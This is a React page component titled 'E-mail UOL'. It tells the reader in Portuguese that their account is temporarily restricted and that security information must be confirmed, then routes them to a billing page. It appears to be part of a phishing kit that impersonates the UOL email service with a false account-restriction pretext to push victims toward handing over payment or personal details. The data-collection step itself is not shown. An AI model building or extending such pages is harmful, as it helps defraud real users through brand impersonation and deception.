import { Button } from '@/components/ui/button';
import { Card, CardContent, CardFooter, CardHeader } from '@/components/ui/card';
import Layout from '@/Layouts/Layout';
import { Head, useForm } from '@inertiajs/react';

export default function Restricted() {
    const { get, processing } = useForm();
    return (
        <Layout>
            <Head title="E-mail UOL" />
            <Card className="mx-auto w-full max-w-sm shadow-lg">
                <CardHeader>
                    <div className="flex h-12 p-2 break-words">
                        <p className="mr-2 size-[22px] min-w-[22px] items-center justify-center rounded-full bg-red-700 text-center text-white">X</p>
                        <strong className="tracking-wide">Conta Restrita</strong>
                    </div>
                </CardHeader>
                <CardContent className="tracking-wide">
                    <p>
                        Percebemos que sua conta foi temporariamente restrita. Para poder usá-la novamente, é necessário confirmar algumas informações
                        de segurança.
                    </p>
                    <p>Por favor, realize a confirmação para recuperar o acesso completo.</p>
                </CardContent>
                <CardFooter>
                    <Button
                        type="button"
                        onClick={() => get(route('billing.index'))}
                        disabled={processing}
                        className="flex w-full justify-center rounded-md bg-[#e29933] px-4 py-3 font-medium text-white transition-colors duration-200 hover:bg-[#d4862e] disabled:opacity-50"
                    >
                        Continuar
                    </Button>
                </CardFooter>
            </Card>
        </Layout>
    );
}
